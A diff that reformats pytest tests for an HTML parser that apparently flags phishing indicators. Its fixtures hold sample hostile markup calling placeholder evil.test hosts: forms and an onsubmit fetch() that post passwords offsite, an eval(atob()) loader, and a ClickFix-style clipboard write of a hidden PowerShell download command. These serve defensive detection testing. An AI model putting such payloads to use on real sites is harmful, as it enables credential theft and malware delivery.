@@ -51,23 +51,32 @@ def test_same_site_form_is_not_cross_origin() -> None:
 
 
 def test_data_uri_form_action() -> None:
-    m = parse_html('<form action="data:text/html;base64,PGgxPng8L2gxPg==" method="post">'
-                   '<input type="password" name="p"></form>', BASE)
+    m = parse_html(
+        '<form action="data:text/html;base64,PGgxPng8L2gxPg==" method="post">'
+        '<input type="password" name="p"></form>',
+        BASE,
+    )
     f = m.forms[0]
     assert f.submits_to_data_uri
     assert f.action.startswith("data:")
 
 
 def test_formaction_override_detected() -> None:
-    m = parse_html('<form action="/ok"><input type=password>'
-                   '<button formaction="https://drop.evil.test/c">Go</button></form>', BASE)
+    m = parse_html(
+        '<form action="/ok"><input type=password>'
+        '<button formaction="https://drop.evil.test/c">Go</button></form>',
+        BASE,
+    )
     assert m.forms[0].is_cross_origin
     assert m.external_form_post
 
 
 def test_onsubmit_js_post() -> None:
-    m = parse_html('<form onsubmit="fetch(\'https://x.evil.test\',{method:\'POST\'});return false">'
-                   '<input type=password></form>', BASE)
+    m = parse_html(
+        "<form onsubmit=\"fetch('https://x.evil.test',{method:'POST'});return false\">"
+        "<input type=password></form>",
+        BASE,
+    )
     assert m.forms[0].submits_offsite_js
     m2 = parse_html('<form onsubmit="return validate()"><input></form>', BASE)
     assert not m2.forms[0].submits_offsite_js
@@ -75,7 +84,8 @@ def test_onsubmit_js_post() -> None:
 
 def test_meta_refresh_to_other_host() -> None:
     m = parse_html(
-        '<meta http-equiv="Refresh" content="0; URL=\'https://next.evil.test/a\'">', BASE)
+        '<meta http-equiv="Refresh" content="0; URL=\'https://next.evil.test/a\'">', BASE
+    )
     assert m.meta.refresh_delay == 0.0
     assert m.meta.refresh_target == "https://next.evil.test/a"
     assert m.meta_refresh_offsite
@@ -95,18 +105,22 @@ def test_meta_refresh_without_url() -> None:
 
 
 def test_meta_csp_referrer_generator() -> None:
-    m = parse_html('<meta http-equiv="Content-Security-Policy" content="default-src \'self\'">'
-                   '<meta name="referrer" content="no-referrer">'
-                   '<meta name="generator" content="Kit 1">')
+    m = parse_html(
+        '<meta http-equiv="Content-Security-Policy" content="default-src \'self\'">'
+        '<meta name="referrer" content="no-referrer">'
+        '<meta name="generator" content="Kit 1">'
+    )
     assert m.meta.csp == "default-src 'self'"
     assert m.meta.referrer == "no-referrer" and m.meta.generator == "Kit 1"
 
 
 def test_obfuscated_inline_script() -> None:
     blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk="
-    html = (f"<script>eval(atob('{blob}')); document.write(unescape('%41'));"
-            f"String.fromCharCode(65);</script>"
-            f'<script src="https://cdn.evil.test/k.js"></script>')
+    html = (
+        f"<script>eval(atob('{blob}')); document.write(unescape('%41'));"
+        f"String.fromCharCode(65);</script>"
+        f'<script src="https://cdn.evil.test/k.js"></script>'
+    )
     m = parse_html(html, BASE)
     assert m.has_eval_like == 5
     assert m.inline_script_entropy.max_blob_len >= len(blob)
@@ -124,15 +138,20 @@ def test_plain_script_not_flagged() -> None:
 
 def test_clipboard_write_clickfix_indicator() -> None:
     cmd = 'powershell -w hidden -c "iwr hxxp://evil.test/a.ps1"'
-    m = parse_html(f"<script>navigator.clipboard.writeText('{cmd}')</script>"
-                   "<button onclick=\"document.execCommand('copy')\">I'm not a robot</button>")
+    m = parse_html(
+        f"<script>navigator.clipboard.writeText('{cmd}')</script>"
+        "<button onclick=\"document.execCommand('copy')\">I'm not a robot</button>"
+    )
     assert m.clipboard_write == 2
 
 
 def test_hidden_iframe() -> None:
-    m = parse_html('<iframe src="https://track.evil.test/f" style="display: none"></iframe>'
-                   '<iframe src="/ok" width="0" height="0" sandbox="allow-scripts"></iframe>'
-                   '<iframe src="/vis" width="600" height="400"></iframe>', BASE)
+    m = parse_html(
+        '<iframe src="https://track.evil.test/f" style="display: none"></iframe>'
+        '<iframe src="/ok" width="0" height="0" sandbox="allow-scripts"></iframe>'
+        '<iframe src="/vis" width="600" height="400"></iframe>',
+        BASE,
+    )
     assert [i.hidden for i in m.iframes] == [True, True, False]
     assert m.iframes[1].sandbox == "allow-scripts" and m.iframes[0].sandbox is None
     assert m.iframes[1].src == "https://login.example.com/ok"
@@ -140,8 +159,9 @@ def test_hidden_iframe() -> None:
 
 
 def test_base_href_is_honoured() -> None:
-    m = parse_html('<base href="https://cdn.evil.test/"><a href="x">x</a>'
-                   '<form action="post"></form>', BASE)
+    m = parse_html(
+        '<base href="https://cdn.evil.test/"><a href="x">x</a><form action="post"></form>', BASE
+    )
     assert m.base_href == "https://cdn.evil.test/"
     assert m.links[0].href == "https://cdn.evil.test/x"
     assert m.forms[0].is_cross_origin
@@ -155,8 +175,10 @@ def test_no_base_url_treats_absolute_as_external() -> None:
 
 
 def test_broken_html_resilient() -> None:
-    m = parse_html("<html><form action=x><input type=password<div><a href='http://a.example.org'"
-                   "<<<>>><script>if(")
+    m = parse_html(
+        "<html><form action=x><input type=password<div><a href='http://a.example.org'"
+        "<<<>>><script>if("
+    )
     assert m.parse_error == ""
     assert isinstance(m.forms, list)
 
@@ -192,15 +214,19 @@ def test_deep_nesting_does_not_crash() -> None:
 
 
 def test_weird_urls_do_not_raise() -> None:
-    m = parse_html('<a href="http://[::1">a</a><a href="  jav\nascript:alert(1)">b</a>'
-                   '<form action="http://exa mple.test:99999/"></form>', BASE)
+    m = parse_html(
+        '<a href="http://[::1">a</a><a href="  jav\nascript:alert(1)">b</a>'
+        '<form action="http://exa mple.test:99999/"></form>',
+        BASE,
+    )
     assert len(m.links) == 2
     assert m.links[1].href.lower().startswith("javascript:")
 
 
 def test_brand_keywords_override_and_word_boundary() -> None:
-    m = parse_html("<body>Apple pie and pineapple; ACME login</body>",
-                   brand_keywords=["apple", "acme"])
+    m = parse_html(
+        "<body>Apple pie and pineapple; ACME login</body>", brand_keywords=["apple", "acme"]
+    )
     assert m.brand_text_hits == {"apple": 1, "acme": 1}
 
 
@@ -212,9 +238,28 @@ def test_never_raises_on_arbitrary_text(s: str) -> None:
 
 
 @settings(max_examples=40, deadline=None)
-@given(st.lists(st.sampled_from(
-    ["<form action='", "<a href=\"", "<script>", "</script>", "<iframe src=",
-     "<meta http-equiv=refresh content='", "<!--", "-->", "<input type=password>",
-     "'>", "\">", "http://x.example/", "<", ">"]), max_size=40))
+@given(
+    st.lists(
+        st.sampled_from(
+            [
+                "<form action='",
+                '<a href="',
+                "<script>",
+                "</script>",
+                "<iframe src=",
+                "<meta http-equiv=refresh content='",
+                "<!--",
+                "-->",
+                "<input type=password>",
+                "'>",
+                '">',
+                "http://x.example/",
+                "<",
+                ">",
+            ]
+        ),
+        max_size=40,
+    )
+)
 def test_never_raises_on_tag_soup(parts: list[str]) -> None:
     parse_html("".join(parts), BASE)
